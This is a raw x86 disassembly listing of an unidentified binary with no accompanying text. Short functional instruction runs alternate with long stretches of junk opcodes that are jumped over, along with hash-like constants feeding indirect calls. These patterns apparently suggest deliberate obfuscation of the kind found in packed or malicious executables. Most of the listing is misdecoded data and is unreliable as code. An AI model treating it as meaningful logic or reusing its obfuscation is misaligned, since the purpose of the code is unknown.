  416737:	or     BYTE PTR [esi-0x40c00fe6],bl
  41673d:	push   0xffffffa1
  41673f:	int    0x70
  416741:	jmp    FWORD PTR [ebx-0x1d69e97c]
  416747:	xchg   ebp,eax
  416748:	test   al,0x4c
  41674a:	push   edi
  41674b:	fsub   QWORD PTR [edx+edx*1-0x76]
  41674f:	fisub  WORD PTR [ecx]
  416751:	or     dl,BYTE PTR [ecx]
  416753:	and    BYTE PTR [ebp-0x4a],dl
  416756:	add    dh,BYTE PTR [esi-0x491d7bbd]
  41675c:	push   0x4ae8da42
  416761:	push   0x4aebda42
  416766:	push   DWORD PTR [ebp-0x68]
  416769:	mov    eax,DWORD PTR [ebp-0x4]
  41676c:	call   eax
  41676e:	mov    eax,DWORD PTR [edi]
  416770:	mov    eax,DWORD PTR [ebp+0x8]
  416773:	push   DWORD PTR [eax]
  416775:	call   0x417c36
  41677a:	mov    eax,ds:0x4331b4
  41677f:	push   0x4
  416781:	add    eax,0x1cc
  416786:	push   eax
  416787:	push   edi
  416788:	call   0x41d107
  41678d:	jmp    0x416858
  416792:	and    al,0x28
  416794:	aaa    
  416795:	adc    eax,0x39261f3f
  41679a:	ror    DWORD PTR [edx],1
  41679c:	mov    edx,0x792440c3
  4167a1:	xor    esp,DWORD PTR [ecx-0x51ffff02]
  4167a7:	add    BYTE PTR [eax],al
  4167a9:	add    ah,ch
  4167ab:	cld    
  4167ac:	jle    0x4167dd
  4167ae:	inc    DWORD PTR [ebp-0x48eed5]
  4167b4:	popf   
  4167b5:	pop    es
  4167b6:	(bad)  
  4167b7:	adc    BYTE PTR [eax-0x7b],ch
  4167ba:	mov    edi,0xd255220a
  4167bf:	push   ebx
  4167c0:	icebp  
  4167c1:	dec    esp
  4167c2:	dec    DWORD PTR [eax]
  4167c4:	xor    ch,BYTE PTR [eax]
  4167c6:	fisub  DWORD PTR [edx+edx*4+0x3e]
  4167ca:	pop    esp
  4167cb:	stos   BYTE PTR es:[edi],al
  4167cc:	adc    al,0x91
  4167ce:	aas    
  4167cf:	fcom   QWORD PTR [edx+0xc405f91]
  4167d5:	pop    ebx
  4167d6:	rcr    ecx,1
  4167d8:	xor    al,0x94
  4167da:	cdq    
  4167db:	cdq    
  4167dc:	popf   
  4167dd:	add    BYTE PTR ds:0x6a5817dc,al
  4167e3:	sbb    edi,DWORD PTR [ebp+0x62]
  4167e6:	pop    ds
  4167e7:	jecxz  0x416817
  4167e9:	dec    ebx
  4167ea:	or     edi,edi
  4167ec:	jmp    0xbcd8314b
  4167f1:	out    0x92,eax
  4167f3:	inc    esi
  4167f4:	jo     0x41683b
  4167f6:	je     0x416796
  4167f8:	and    BYTE PTR [edx+eiz*1+0x50],al
  4167fc:	mov    ds:0xb0fdf61,al
  416801:	cmp    al,0xf4
  416803:	loopne 0x4167cf
  416805:	dec    ecx
  416806:	pop    esi
  416807:	xchg   esp,eax
  416808:	out    0x72,eax
  41680a:	mov    edi,0x94902df8
  41680f:	nop
  416810:	xchg   ebp,eax
  416811:	test   al,0xf0
  416813:	jo     0x4167db
  416815:	pop    ss
  416816:	mov    al,0x29
  416818:	repnz leave 
  41681a:	rcl    esp,cl
  41681c:	mov    ecx,0x17d48209
  416821:	(bad)  
  416822:	out    0x97,eax
  416824:	push   ds
  416825:	and    eax,0xd0e45867
  41682a:	sahf   
  41682b:	mov    esp,0x72cbd5b5
  416830:	and    al,ah
  416832:	das    
  416833:	aas    
  416834:	mov    ds:0xfac43fe6,eax
  416839:	dec    edx
  41683a:	(bad)  
  41683b:	ret    0x1d3
  41683e:	fidiv  DWORD PTR [edx]
  416840:	cs ss jmp 0x5ccd:0x754e6c56
  416849:	cmp    BYTE PTR [ebx-0x4f5575a0],0x9b
  416850:	popf   
  416851:	std    
  416852:	mov    esp,edi
  416854:	(bad)  
  416855:	mov    edi,0xc95e3e19
  41685a:	ret    0x4
  41685d:	push   ebp
  41685e:	mov    ebp,esp
  416860:	sub    esp,0x20
  416863:	push   edi
  416864:	mov    DWORD PTR [ebp-0x8],0x6ba9caa0
  41686b:	mov    DWORD PTR [ebp-0x4],0x61c2
  416872:	mov    DWORD PTR [ebp-0x10],0x5968
  416879:	push   0x28ce
  41687e:	mov    DWORD PTR [ebp-0xc],0x7e3
  416885:	mov    eax,DWORD PTR [ebp-0x10]
  416888:	mov    ecx,DWORD PTR [ebp-0xc]
  41688b:	jmp    0x41695f
  416890:	ss jg  0x41684b
  416893:	popf   
  416894:	stc    
  416895:	fbstp  TBYTE PTR [edi]
  416897:	jmp    DWORD PTR [ecx+edx*2]
  41689a:	addr16 aas 
  41689c:	push   esi
  41689d:	mov    WORD PTR [edx+edx*4+0xff4f],?
  4168a4:	mov    bh,0x0
  4168a6:	add    BYTE PTR [eax],al
  4168a8:	cmp    al,0x89
  4168aa:	sbb    eax,0xb9482fef
  4168af:	pop    ss
  4168b0:	jle    0x4168d8
  4168b2:	mov    ecx,0x982317a6
  4168b7:	pushf  
  4168b8:	mov    esi,0x54d5eab9
  4168bd:	xchg   ebx,eax
  4168be:	inc    esp
  4168bf:	shl    DWORD PTR [edi],1
  4168c1:	into   
  4168c2:	into   
  4168c3:	mov    eax,ds:0x80c57cd9
  4168c8:	cmp    BYTE PTR [ebp-0xd],dl
  4168cb:	dec    edi
  4168cc:	fcomp  QWORD PTR [ecx+0x5ea53b06]
  4168d2:	fisubr DWORD PTR [ebp-0x42004bd]
  4168d8:	cmp    ah,BYTE PTR [edx+edx*4]
  4168db:	sar    DWORD PTR [ebp-0x2f],0x1a
  4168df:	mov    bl,0xc7
  4168e1:	jae    0x416930
  4168e3:	mov    ch,0x38
  4168e5:	cmp    BYTE PTR ds:0x3c129a15,ch
  4168eb:	xchg   ebp,eax
  4168ec:	jno    0x416900
  4168ee:	hlt    
  4168ef:	in     al,dx
  4168f0:	ror    DWORD PTR [ebx+edx*4+0x64fa4868],0xc9
  4168f8:	fcom   DWORD PTR [edx+0x23]
  4168fb:	arpl   WORD PTR [ebp+eax*8-0x2],bp
  4168ff:	add    DWORD PTR [ebp-0x5e],esi
  416902:	push   ss
  416903:	mov    al,BYTE PTR [eax+0x567cc4c9]
  416909:	push   esi
  41690a:	cmp    dl,ah
  41690c:	pushf  
  41690d:	inc    ecx
  41690e:	test   al,0x8c
  416910:	pop    edi
  416911:	(bad)  
  416912:	mov    ebx,0x86c41d6c
  416917:	push   ds
  416918:	jge    0x416967
  41691a:	xchg   ebp,eax
  41691b:	test   eax,0xd4a377d3
  416920:	in     eax,dx
  416921:	out    dx,eax
  416922:	adc    edx,ecx
  416924:	inc    esp
  416925:	sub    DWORD PTR [esi+eax*8],ebx
  416928:	jns    0x4168ca
  41692a:	shl    DWORD PTR [ebp-0x4e],cl
  41692d:	sub    al,0xb0
  41692f:	ds ins DWORD PTR es:[edi],dx
  416931:	(bad)  [edx-0x6b7e1cb5]
  416937:	pushf  
  416938:	pop    edi
  416939:	adc    ah,dl
  41693b:	mov    dl,0x4c
  41693d:	jbe    0x416988
  41693f:	cli    
  416940:	jmp    0x79f1:0xe2d1b13e
  416947:	and    esp,eax
  416949:	test   BYTE PTR [edx],0x38
  41694c:	test   al,0x46
  41694e:	jo     0x416912
  416950:	xchg   esi,eax
  416951:	sub    BYTE PTR [eax-0x1f],cl
  416954:	xchg   edx,eax
  416955:	mov    bl,0x9a
  416957:	sar    BYTE PTR [eax-0x57c13f5c],1
  41695d:	loop   0x416956
  41695f:	push   0x346b
  416964:	push   ecx
  416965:	push   eax
  416966:	call   0x42eace
  41696b:	jmp    0x416a3f
  416970:	sbb    eax,0xdd25c988
  416975:	gs std 
  416977:	mov    eax,0xa1f8e0d7
  41697c:	adc    DWORD PTR [ebx+0x3d],esi
  41697f:	int    0x6
  416981:	add    BYTE PTR [ecx],al
  416983:	add    BYTE PTR [edi-0x5000000],dh
  416989:	sub    eax,0xffde0324
  41698e:	adc    eax,0x2bec869b
  416993:	push   0x63
  416995:	enter  0x9ac9,0xb0
  416999:	jae    0x416a15
  41699b:	inc    esp
  41699c:	dec    edi
  41699d:	inc    esi
  41699e:	add    esp,ecx
  4169a0:	ret    
  4169a1:	jno    0x4169cc
  4169a3:	js     0x416953
  4169a5:	xor    al,0x4e
  4169a7:	ja     0x41698b
  4169a9:	push   ecx
  4169aa:	sbb    eax,0x8b3f5ad5
  4169af:	gs sbb ecx,0xdc4ddb1
  4169b6:	inc    edi
  4169b7:	jo     0x4169c0
  4169b9:	cdq    
  4169ba:	int    0x28
  4169bc:	sbb    eax,0x34cac424
  4169c1:	aas    
  4169c2:	xor    DWORD PTR ss:[ecx+ebp*4],0xffffffd4
  4169c7:	adc    al,ah
  4169c9:	mov    cl,0xa3
  4169cb:	push   0xffffffa3
  4169cd:	cmp    eax,0xaa5a7dbb
  4169d2:	pop    edi
  4169d3:	add    bl,bh
  4169d5:	idiv   DWORD PTR [ecx]
  4169d7:	inc    ecx
  4169d8:	dec    edi
  4169d9:	cmp    eax,0x839d0e42
  4169de:	xchg   edx,edi
  4169e0:	stos   DWORD PTR es:[edi],eax
  4169e1:	scas   al,BYTE PTR es:[edi]
  4169e2:	mov    esi,0x4c61355a
  4169e7:	xchg   edx,eax
  4169e8:	int    0xa1
  4169ea:	loop   0x4169a4
  4169ec:	dec    ebp
  4169ed:	gs xchg edx,eax
  4169ef:	pusha  
  4169f0:	div    BYTE PTR [eax+0x31e4a977]
  4169f6:	ror    DWORD PTR [edx+0x1db009db],0x0
  4169fd:	(bad)  
  4169fe:	fcomp  QWORD PTR [edi]
  416a00:	in     eax,0x5f
  416a02:	sbb    al,0x41
  416a04:	xchg   esi,eax
  416a05:	xor    al,0x60
  416a07:	jmp    0x4169c4
  416a09:	pop    ss
  416a0a:	inc    edx
  416a0b:	push   es
  416a0c:	scas   eax,DWORD PTR es:[edi]
  416a0d:	mov    ds,WORD PTR [ecx+0xc]
  416a10:	mov    dl,0x9a
  416a12:	mov    ah,0x0
  416a14:	(bad)  
  416a15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a16:	arpl   si,bx
  416a18:	add    dl,BYTE PTR [edi]
  416a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a1b:	(bad)  
  416a1c:	int    0xa0
  416a1e:	jl     0x416a5e
  416a20:	mov    al,ds:0xc87bc7c9
  416a25:	xlat   BYTE PTR ds:[ebx]
  416a26:	pop    ss
  416a27:	xchg   edx,eax
  416a28:	loopne 0x416a64
  416a2a:	shl    BYTE PTR [eax],cl
  416a2c:	inc    edx
  416a2d:	push   ebp
  416a2e:	xor    dh,ah
  416a30:	mov    ch,0xf6
  416a32:	(bad)  [ebx+0x2330c24e]
  416a38:	adc    BYTE PTR [esi+eax*1+0x3e],0x97
  416a3d:	inc    DWORD PTR [esi-0x75]
  416a40:	dec    ebp
  416a41:	clc    
  416a42:	mov    edi,DWORD PTR [ebp-0x4]
  416a45:	push   edi
  416a46:	push   ecx
  416a47:	push   edx
  416a48:	push   eax
  416a49:	call   0x423dad
  416a4e:	xor    eax,0x404
  416a53:	or     eax,0x59fb
  416a58:	sub    eax,0x7df7
  416a5d:	mov    DWORD PTR [esi],eax
  416a5f:	jmp    0x416b33
  416a64:	sbb    BYTE PTR [esi-0x26086709],bh
  416a6a:	jg     0x416a2a
  416a6c:	icebp  
  416a6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a6e:	ss addr16 repnz or al,0xe9
  416a73:	outs   dx,BYTE PTR ds:[esi]
  416a74:	mov    ebp,0xb7000100
  416a79:	add    BYTE PTR [eax],al
  416a7b:	add    BYTE PTR [ecx],dh
  416a7d:	sbb    eax,0x198c0a04
  416a82:	and    edi,DWORD PTR [ebp-0x3d2dbc53]
  416a88:	stos   BYTE PTR es:[edi],al
  416a89:	inc    BYTE PTR [ebx]
  416a8b:	push   ds
  416a8c:	les    eax,FWORD PTR ss:[esi+0x56]
  416a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a91:	jmp    0x2aff7a3c
  416a96:	push   edi
  416a97:	ja     0x416afc
  416a99:	xchg   esp,eax
  416a9a:	mov    al,ds:0x143835c4
  416a9f:	jo     0x416aba
  416aa1:	add    DWORD PTR [ecx-0x1f6cb097],edi
  416aa7:	jo     0x416a4b
  416aa9:	mov    WORD PTR [ebx+0x3a],gs
  416aac:	imul   esp,DWORD PTR [edx],0xffffffa0
  416aaf:	adc    dl,BYTE PTR [ecx]
  416ab1:	in     al,dx
  416ab2:	shr    BYTE PTR [ebx],cl
  416ab4:	jmp    0x416a54
  416ab6:	adc    al,BYTE PTR [ebp+0x713f2086]
  416abc:	aas    
  416abd:	jg     0x416b10
  416abf:	sahf   
  416ac0:	xor    BYTE PTR fs:[eax-0x247a9f5a],dl
  416ac7:	scas   eax,DWORD PTR es:[edi]
  416ac8:	push   cs
  416ac9:	rcr    BYTE PTR [eax+eax*2],cl
  416acc:	mov    DWORD PTR [edx+eiz*2],ecx
  416acf:	test   al,0x71
  416ad1:	xchg   esp,eax
  416ad2:	or     esp,ebx
  416ad4:	out    0xcf,eax
  416ad6:	std    
  416ad7:	shl    esi,1
  416ad9:	iret   
  416ada:	fisub  DWORD PTR [ecx+0x4aa59c61]
  416ae0:	mov    cl,0x91
  416ae2:	cmp    ebp,ecx
  416ae4:	cli    
  416ae5:	in     eax,0x19
  416ae7:	jmp    0xeb0c0210
  416aec:	or     edx,DWORD PTR [esi-0x1ae84fc3]
  416af2:	cmp    ebx,edi
  416af4:	sbb    DWORD PTR [ecx-0x4ea5fe4b],ecx
  416afa:	xor    DWORD PTR [edi],ebp
  416afc:	sar    edx,1
  416afe:	mov    dl,0xd7
  416b00:	push   esp
  416b01:	test   al,0x37
  416b03:	mov    al,BYTE PTR [eax+0x1f]
  416b06:	pop    edi
  416b07:	xchg   ebx,eax
  416b08:	pop    ebx
  416b09:	push   eax
  416b0a:	or     esp,esi
  416b0c:	stos   BYTE PTR es:[edi],al
  416b0d:	jnp    0x416b27
  416b0f:	add    eax,DWORD PTR [esi-0x39]
  416b12:	xchg   edi,eax
  416b13:	inc    edi
  416b14:	and    ch,BYTE PTR [ebp-0x6230067a]
  416b1a:	icebp  
  416b1b:	in     eax,dx
  416b1c:	enter  0xac43,0xc6
  416b20:	dec    edi
  416b21:	xchg   ecx,eax
  416b22:	out    dx,al
  416b23:	pusha  
  416b24:	jl     0x416b69
  416b26:	dec    edx
  416b27:	xor    ebp,DWORD PTR [esi]
  416b29:	and    DWORD PTR [edi],esp
  416b2b:	sub    eax,0x5ef9dc72
  416b30:	mov    BYTE PTR [esp+ecx*4-0x3d1fba39],dh
  416b37:	add    BYTE PTR ds:[eax],al
  416b3a:	mov    DWORD PTR [ebp-0x1c],0x2c49
  416b41:	mov    DWORD PTR [ebp-0x18],0xf0f0f0f
  416b48:	mov    DWORD PTR [ebp-0x14],0x0
  416b4f:	mov    DWORD PTR [ebp-0x10],0x2e71
  416b56:	mov    DWORD PTR [ebp-0xc],0x3f4b
  416b5d:	jmp    0x416c31
  416b62:	add    ebp,DWORD PTR [edi]
  416b64:	rcr    BYTE PTR [ebp-0x2],cl
  416b67:	std    
  416b68:	(bad)  
  416b69:	jg     0x416bcc
  416b6b:	ja     0x416b3a
  416b6d:	cmp    BYTE PTR [edx+0x74cdac58],ah
  416b73:	add    DWORD PTR [ecx],eax
  416b75:	add    BYTE PTR [edi-0x47000000],dh
  416b7b:	in     eax,dx
  416b7c:	xchg   ebx,eax
  416b7d:	loopne 0x416b66
  416b7f:	add    al,BYTE PTR [ecx+0x5c]
  416b82:	and    cl,BYTE PTR [edx+0x6dc1f5bc]
  416b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b89:	dec    esp
  416b8a:	enter  0x6882,0xa4
  416b8e:	sti    
  416b8f:	cdq    
  416b90:	(bad)  
  416b92:	add    ebx,DWORD PTR [edi+ecx*8-0x6f1455b3]
  416b99:	pop    edx
  416b9a:	rol    ecx,0xd1
  416b9d:	xlat   BYTE PTR ds:[ebx]
  416b9e:	pause  
  416ba0:	pop    ecx
  416ba1:	inc    edi
  416ba2:	clc    
  416ba3:	aam    0x41
  416ba5:	rol    BYTE PTR [ebp+0x48cb0471],0x85
  416bac:	xchg   ecx,eax
  416bad:	pop    eax
  416bae:	and    ebx,DWORD PTR [edx+ecx*1]
  416bb1:	lods   eax,DWORD PTR ds:[esi]
  416bb2:	dec    ebx
  416bb3:	cmp    eax,DWORD PTR [ecx+ebp*1+0x7fa6b770]
  416bba:	and    eax,0x99608665
  416bbf:	adc    eax,0x8239b758
  416bc4:	mov    cl,0x2a
  416bc6:	fistp  DWORD PTR [ecx+0x4c]
  416bc9:	jns    0x416bf5
  416bcb:	aad    0x85
  416bcd:	push   ebp
  416bce:	retf   0x48f5
  416bd1:	fcom   QWORD PTR [eax]
  416bd3:	pop    esp
  416bd4:	ins    BYTE PTR es:[edi],dx
  416bd5:	mov    ds:0x83e35279,al
  416bda:	icebp  
  416bdb:	(bad)  
  416bdc:	xlat   BYTE PTR ds:[ebx]
  416bdd:	or     cl,BYTE PTR [ebp-0x65290ec6]
  416be3:	int    0xb5
  416be5:	push   ebp
  416be6:	addr16 jnp 0x416c55
  416be9:	fbld   TBYTE PTR [ebx]
  416beb:	cmp    DWORD PTR [eax-0x78],ecx
  416bee:	int    0xf0
  416bf0:	cli    
  416bf1:	add    BYTE PTR [edi],cl
  416bf3:	and    ecx,DWORD PTR [ebp-0x2c]
  416bf6:	out    0xc1,eax
  416bf8:	daa    
  416bf9:	or     eax,0xac80e985
  416bfe:	push   esp
  416bff:	inc    ecx
  416c00:	dec    ecx
  416c01:	(bad)  
  416c02:	dec    edx
  416c03:	stos   BYTE PTR es:[edi],al
  416c04:	jle    0x416c6c
  416c06:	xor    BYTE PTR [ebp+0x6e],ch
  416c09:	lahf   
  416c0a:	std    
  416c0b:	lahf   
  416c0c:	mov    esp,0x2e1b0103
  416c11:	stc    
  416c12:	xor    al,0x5a
  416c14:	cmp    al,0x4b
  416c16:	push   ss
  416c17:	adc    BYTE PTR [ebx],bh
  416c19:	cli    
  416c1a:	addr16 pop esi
  416c1c:	int3   
  416c1d:	mov    ds:0x5ef922c,eax
  416c22:	jle    0x416c4c
  416c24:	btr    ebp,0xfb
  416c28:	dec    esi
  416c29:	sub    eax,DWORD PTR [edx+0x5cf1e478]
  416c2f:	outs   dx,DWORD PTR ds:[esi]
  416c30:	daa    
  416c31:	mov    DWORD PTR [ebp-0x4],0x23f1
  416c38:	mov    eax,DWORD PTR [ebp-0x10]
  416c3b:	mov    ecx,DWORD PTR [ebp-0xc]
  416c3e:	jmp    0x416d12
  416c43:	push   0x4c
  416c45:	pushf  
  416c46:	xchg   edx,eax
  416c47:	mov    esi,0x26fc6ed2
  416c4c:	retf   
  416c4d:	(bad)  
  416c4e:	mov    eax,ds:0x4e922bc3
  416c53:	sub    eax,DWORD PTR [edx]
  416c55:	add    DWORD PTR [eax],eax
  416c57:	mov    bh,0x0
  416c59:	add    BYTE PTR [eax],al
  416c5b:	aam    0xab
  416c5d:	in     eax,0xfe
  416c5f:	push   0x13
  416c61:	in     eax,dx
  416c62:	xchg   esp,eax
  416c63:	icebp  
  416c64:	xor    al,bl
  416c66:	xchg   edx,eax
  416c67:	cwde   
  416c68:	ret    0x616d
  416c6b:	xor    dh,BYTE PTR [edx+0x36]
  416c6e:	arpl   WORD PTR [edx+0x49],si
  416c71:	stos   DWORD PTR es:[edi],eax
  416c72:	dec    ebx
  416c73:	or     bl,al
  416c75:	mov    ch,BYTE PTR [eax+0x51]
  416c78:	inc    ebp
  416c79:	repz sbb DWORD PTR [esi+eiz*2+0x4cc0aad5],ecx
  416c81:	and    DWORD PTR [ecx-0x75883540],ebx
  416c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c88:	pop    edi
  416c89:	xlat   BYTE PTR ds:[ebx]
  416c8a:	sahf   
  416c8b:	clc    
  416c8c:	outs   dx,DWORD PTR ds:[esi]
  416c8d:	stos   BYTE PTR es:[edi],al
  416c8e:	inc    esp
  416c8f:	mov    ecx,0x723fccf4
  416c94:	mov    bh,0xee
  416c96:	pusha  
  416c97:	aam    0x86
  416c99:	fisttp DWORD PTR [ecx-0x5646f6ed]
  416c9f:	mov    BYTE PTR [ecx-0x1f],dh
  416ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ca3:	mov    cl,0xfb
  416ca5:	idiv   edi
  416ca7:	sub    BYTE PTR [ecx-0x28ddfce],ch
  416cad:	hlt    
  416cae:	ret    0x61d0
  416cb1:	jno    0x416c51
  416cb3:	mov    ebx,0x646087d2
  416cb8:	adc    eax,eax
  416cba:	and    al,0x23
  416cbc:	sbb    esi,DWORD PTR [esi+ebp*8]
  416cbf:	adc    al,0x34
  416cc1:	pop    edi
  416cc2:	jae    0x416ce9
  416cc4:	adc    al,0x79
  416cc6:	adc    DWORD PTR [eax-0x155a6541],esi
  416ccc:	adc    BYTE PTR [edi-0x248a5190],al
  416cd2:	adc    al,0x6d
  416cd4:	pop    esi
  416cd5:	pusha  
  416cd6:	lods   al,BYTE PTR ds:[esi]
  416cd7:	and    eax,0x72639784
  416cdc:	xchg   ebp,eax
  416cdd:	rcr    BYTE PTR [eax-0x11],0xfd
  416ce1:	pusha  
  416ce2:	retf   0xa28a
  416ce5:	jo     0x416cd3
  416ce7:	fnsave [ebp+eiz*1+0x69306c02]
  416cee:	xchg   ebp,eax
  416cef:	sbb    eax,0x8c5f88ae
  416cf4:	dec    ecx
  416cf5:	add    al,0xd4
  416cf7:	jl     0x416d14
  416cf9:	inc    ebx
  416cfa:	icebp  
  416cfb:	and    edx,DWORD PTR [eax-0x3a]
  416cfe:	jmp    0x50ff2e20
  416d03:	inc    eax
  416d04:	ror    ecx,1
  416d06:	mov    esi,0x9e925224
  416d0b:	cmp    eax,0xc05dd84
  416d10:	jle    0x416d27
  416d12:	mov    edx,DWORD PTR [ebp-0x18]
  416d15:	jmp    0x416de9
  416d1a:	adc    al,0x60
  416d1c:	add    DWORD PTR [edi+esi*8],0xffffffe7
  416d20:	xchg   edi,eax
  416d21:	jo     0x416d95
  416d23:	pop    ds
  416d24:	push   esp
  416d25:	mov    edi,0x22065c9
  416d2a:	loop   0x416d2e
  416d2c:	add    DWORD PTR [eax],eax
  416d2e:	mov    bh,0x0
  416d30:	add    BYTE PTR [eax],al
  416d32:	pop    esi
  416d33:	cmp    bh,BYTE PTR [edi+ecx*8]
  416d36:	jb     0x416ce5
  416d38:	mov    dl,0x1a
  416d3a:	ret    0x4b18
  416d3d:	sbb    ecx,eax
  416d3f:	cmp    BYTE PTR [edi-0x39a2eddf],cl
  416d45:	push   0x1b
  416d47:	jecxz  0x416d44
  416d49:	std    
  416d4a:	cs dec ebx
  416d4c:	sbb    dh,BYTE PTR [ecx+edx*8]
  416d4f:	xor    al,0xdd
  416d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d52:	loopne 0x416d85
  416d54:	sub    ah,BYTE PTR [eax+eax*1]
  416d57:	jp     0x416cec
  416d59:	loop   0x416db0
  416d5b:	in     eax,dx
  416d5c:	int    0x59
  416d5e:	mov    ebp,DWORD PTR [edx]
  416d60:	xchg   esp,eax
  416d61:	das    
  416d62:	xchg   DWORD PTR [ecx-0x76c360c],eax
  416d68:	or     bh,BYTE PTR [esi]
  416d6a:	push   ebp
  416d6b:	int3   
  416d6c:	js     0x416db7
  416d6e:	dec    eax
  416d6f:	popa   
  416d70:	adc    DWORD PTR [eax+0x2e8f0873],0xd
  416d77:	sub    DWORD PTR [ebx+0x6e],0xfffffff4
  416d7b:	cld    
  416d7c:	jnp    0x416d4b
  416d7e:	out    0xad,al
  416d80:	cdq    
  416d81:	or     dh,cl
  416d83:	jo     0x416d26
  416d85:	fmul   QWORD PTR [edi]
  416d87:	ins    DWORD PTR es:[edi],dx
  416d88:	inc    eax
  416d89:	lahf   
  416d8a:	rcl    BYTE PTR [ebp-0xb6d71da],0xc7
  416d91:	dec    edx
  416d92:	ret    0x6164
  416d95:	cld    
  416d96:	scas   eax,DWORD PTR es:[edi]
  416d97:	mov    ebp,0xc1bd089b
  416d9c:	jmp    0x94d3:0xdead0458
  416da3:	mov    dh,BYTE PTR [esi]
  416da5:	pop    eax
  416da6:	push   0xa9d84737
  416dab:	jnp    0x416d57
  416dad:	push   ebp
  416dae:	in     al,0x42
  416db0:	pop    es
  416db1:	fnsave [esi-0x25f6a643]
  416db7:	ficom  WORD PTR [eax-0x6fecd3de]
  416dbd:	mov    dl,0xb7
  416dbf:	or     al,0xdc
  416dc1:	out    dx,al
  416dc2:	loopne 0x416dce
  416dc4:	adc    DWORD PTR [esi+0x3072740d],ecx
  416dca:	mov    ebp,0x38416a87
  416dcf:	test   al,0x24
  416dd1:	js     0x416d61
  416dd3:	loope  0x416e30
  416dd5:	je     0x416dfa
  416dd7:	mov    esi,DWORD PTR [ecx]
  416dd9:	adc    dl,BYTE PTR [edx-0x2]
  416ddc:	icebp  
  416ddd:	arpl   bp,di
  416ddf:	jp     0x416d96
  416de1:	pop    edi
  416de2:	rcr    DWORD PTR [esi],1
  416de4:	daa    
  416de5:	push   ds
  416de6:	retf   
  416de7:	xchg   ecx,eax
  416de8:	pop    ds
  416de9:	mov    edi,DWORD PTR [ebp-0x14]
  416dec:	push   edi
  416ded:	push   edx
  416dee:	and    ecx,0x351
  416df4:	jmp    0x416ec8
  416df9:	ins    BYTE PTR es:[edi],dx
  416dfa:	add    al,0x81
  416dfc:	or     ebp,ecx
  416dfe:	(bad)  
  416dff:	out    dx,al
  416e00:	addr16 push es
  416e02:	shr    esp,cl
  416e04:	or     eax,0x65e56f77
  416e09:	cdq    
  416e0a:	add    eax,DWORD PTR [ecx]
  416e0c:	add    BYTE PTR [edi+0x65000000],dh
  416e12:	(bad)  
  416e13:	ja     0x416e7c
  416e15:	out    0x64,al
  416e17:	fistp  DWORD PTR [ebx-0x2ca3a4e7]
  416e1d:	inc    edx
  416e1e:	(bad)  
  416e1f:	dec    esi
  416e20:	pop    edx
  416e21:	or     BYTE PTR [ecx],dl
  416e23:	jg     0x416e82
  416e25:	xchg   edi,eax
  416e26:	jle    0x416e8d
  416e28:	out    0x4f,al
  416e2a:	cmp    eax,0x41627b62
  416e2f:	adc    al,0x98
  416e31:	push   ebp
  416e32:	enter  0x9b7a,0x12
  416e36:	lahf   
  416e37:	mov    bl,0x6d
  416e39:	inc    ecx
  416e3a:	inc    esi
  416e3b:	mov    cl,0x52
  416e3d:	aaa    
  416e3e:	jp     0x416e34
  416e40:	outs   dx,BYTE PTR ds:[esi]
  416e41:	cwde   
  416e42:	enter  0x164b,0xb1
  416e46:	push   ecx
  416e47:	mov    esi,0xf9e250e1
  416e4c:	jo     0x416dd6
  416e4e:	call   0x7348b975
  416e53:	sbb    esi,eax
  416e55:	mov    eax,0x50a8f67a
  416e5a:	or     dl,BYTE PTR ds:0x557a6a1
  416e60:	and    ch,BYTE PTR [esi+esi*1]
  416e63:	dec    edx
  416e64:	xlat   BYTE PTR ds:[ebx]
  416e65:	xor    al,0x4d
  416e67:	inc    ebx
  416e68:	jle    0x416e17
  416e6a:	add    BYTE PTR [edx-0x415044d4],dh
  416e70:	push   0xd68eb4ed
  416e75:	ret    
  416e76:	mov    ch,0xc0
  416e78:	fs ins DWORD PTR es:[edi],dx
  416e7a:	xchg   edi,eax
  416e7b:	cli    
  416e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e7d:	xor    DWORD PTR [eax-0x67e540bc],0xffffffd7
  416e84:	dec    edx
  416e85:	mov    WORD PTR [edi-0x267674f3],?
  416e8b:	lahf   
  416e8c:	jl     0x416e90
  416e8e:	rcl    BYTE PTR [ecx],1
  416e90:	mov    ch,dh
  416e92:	je     0x416e1b
  416e94:	mov    ss,WORD PTR [eax-0xeac867b]
  416e9a:	test   al,0xa8
  416e9c:	cmp    eax,0x5d357319
  416ea1:	cmp    eax,0x83c0405f
  416ea6:	cmp    DWORD PTR [edx],edi
  416ea8:	inc    esi
  416ea9:	shl    esp,0x4d
  416eac:	imul   esp,DWORD PTR [edx+esi*4-0x539e7417],0xffffffd7
  416eb4:	pop    edi
  416eb5:	aas    
  416eb6:	stos   BYTE PTR es:[edi],al
  416eb7:	jns    0x416f32
  416eb9:	jmp    0x416e85
  416ebb:	adc    dl,ch
  416ebd:	mov    dl,0x3b
  416ebf:	adc    BYTE PTR [edi+0x11374ec],cl
  416ec5:	scas   eax,DWORD PTR es:[edi]
  416ec6:	mov    ebp,0x11f62513
  416ecb:	add    BYTE PTR [eax],al
  416ecd:	push   ecx
  416ece:	jmp    0x416fa2
  416ed3:	sar    DWORD PTR ds:0xffeec8ca,1
  416ed9:	sar    DWORD PTR ds:0xcd1a5ef9,cl
  416edf:	stos   BYTE PTR es:[edi],al
  416ee0:	cs mov dh,0xcd
  416ee3:	push   eax
  416ee4:	add    al,0x1
  416ee6:	add    BYTE PTR [edi-0x3000000],dh
  416eec:	xchg   esp,eax
  416eed:	mov    al,ds:0x27a21bc3
  416ef2:	add    ebx,DWORD PTR [ecx]
  416ef4:	jnp    0x416f50
  416ef6:	sub    BYTE PTR [esi+0x75],dh
  416ef9:	sub    eax,0xed1ec85d
  416efe:	add    BYTE PTR [ebx+0x2e2b30b],al
  416f04:	pusha  
  416f05:	push   ds
  416f06:	sub    DWORD PTR [eax+0x5f1cd371],ecx
  416f0c:	les    eax,FWORD PTR [edx]
  416f0e:	inc    edi
  416f0f:	je     0x416ef5
  416f11:	push   ds
  416f12:	pop    ss
  416f13:	inc    edi
  416f14:	mov    ds:0xc8b2aa16,eax
  416f19:	xor    eax,0x52a490e3
